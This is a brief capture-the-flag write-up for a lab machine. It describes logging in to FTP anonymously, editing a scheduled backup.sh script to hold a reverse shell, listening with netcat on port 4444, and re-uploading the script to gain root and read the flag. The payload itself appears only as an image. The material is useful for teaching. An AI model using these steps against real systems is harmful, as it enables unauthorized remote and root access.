## **Accessing the machine**
>	- Accessing the `ftp` server using `ftp MACHINE_IP` with `anonymous` user.![](ftp-login.png)
>	- Download the `backup.sh` file from `/public/` using `get /public/backup.sh`.
## **Exploiting**
>	- Editing the file to put a reverse shell.![](reverse-shell.png)
>	- Set up a `netcat` listener using `nc -lvnp 4444`.
>	- Upload `backup.sh` to the ftp server using `put backup.sh`.
>	- Wait for the script to run (1 min).![](root-access.png)
>	- Required `flag.txt` can be found.![](flag.png)